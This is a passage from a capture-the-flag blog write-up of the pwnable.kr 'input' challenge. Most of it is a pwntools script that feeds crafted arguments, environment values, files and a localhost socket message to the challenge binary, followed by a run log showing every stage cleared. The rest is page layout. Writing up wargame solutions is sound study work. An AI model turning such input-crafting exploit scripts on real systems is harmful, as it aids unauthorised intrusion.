+<span class="n">argv_ans</span><span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)]</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">argv_ans</span><span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">)]</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./stderr&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x02\xff</span><span class="s1">&#39;</span><span class="p">);</span>
+
+<span class="n">env_ans</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">:</span><span class="s1">&#39;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s1">&#39;</span><span class="p">}</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">argv_ans</span><span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">)]</span> <span class="o">=</span> <span class="s1">&#39;9999&#39;</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">executable</span><span class="o">=</span><span class="s1">&#39;/home/input2/input&#39;</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="n">argv_ans</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./stderr&#39;</span><span class="p">),</span><span class="n">env</span><span class="o">=</span><span class="n">env_ans</span><span class="p">)</span>
+
+<span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x00\xff</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">local</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;9999&#39;</span><span class="p">)</span>
+<span class="n">local</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">target</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">input2@pwnable:/tmp/iptest$ python exploit.py
+<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/home/input2/input&#39;</span>: pid <span class="m">5668</span>
+<span class="o">[</span>+<span class="o">]</span> Opening connection to localhost on port 9999: Done
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+Welcome to pwnable.kr
+Let<span class="err">&#39;</span>s see <span class="k">if</span> you know how to give input to program
+Just give me correct inputs <span class="k">then</span> you will get the flag :<span class="o">)</span>
+Stage <span class="m">1</span> clear!
+Stage <span class="m">2</span> clear!
+Stage <span class="m">3</span> clear!
+Stage <span class="m">4</span> clear!
+Stage <span class="m">5</span> clear!
+Mommy! I learned how to pass various input in Linux :<span class="o">)</span>
+</code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwnable.kr/">pwnable.kr</a>
+        
+            <a href="/tags/pwn/">pwn</a>
+        
+            <a href="/tags/wargame/">Wargame</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/pwnable.kr-random/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwnable.kr-random/pwn.27d192822b67a69976d928bddccd3f34_hu894f602aab8ef4f7b7afefcfbc650dba_71661_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr random"
+                        
+                        data-hash="md5-J9GSgitnppl22Si93M0/NA==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">pwnable.kr random</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/pwnable.kr-passcode/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwnable.kr-passcode/pwn.27d192822b67a69976d928bddccd3f34_hu894f602aab8ef4f7b7afefcfbc650dba_71661_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr passcode"
+                        
+                        data-hash="md5-J9GSgitnppl22Si93M0/NA==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">pwnable.kr passcode</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/pwnable.kr-cmd2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwnable.kr-cmd2/pwn.27d192822b67a69976d928bddccd3f34_hu894f602aab8ef4f7b7afefcfbc650dba_71661_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr cmd2"
+                        
+                        data-hash="md5-J9GSgitnppl22Si93M0/NA==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">pwnable.kr cmd2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/pwnable.kr-cmd1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwnable.kr-cmd1/pwn.27d192822b67a69976d928bddccd3f34_hu894f602aab8ef4f7b7afefcfbc650dba_71661_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr cmd1"
+                        
+                        data-hash="md5-J9GSgitnppl22Si93M0/NA==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">pwnable.kr cmd1</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/pwnable.kr-shell-shock/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwnable.kr-shell-shock/pwn.27d192822b67a69976d928bddccd3f34_hu894f602aab8ef4f7b7afefcfbc650dba_71661_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr shell shock"
+                        
+                        data-hash="md5-J9GSgitnppl22Si93M0/NA==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">pwnable.kr shell shock</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "appealso-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 SooHo&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+    </section>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789" crossorigin="anonymous"></script>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789"
+     crossorigin="anonymous"></script>
+
+
+            </main>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
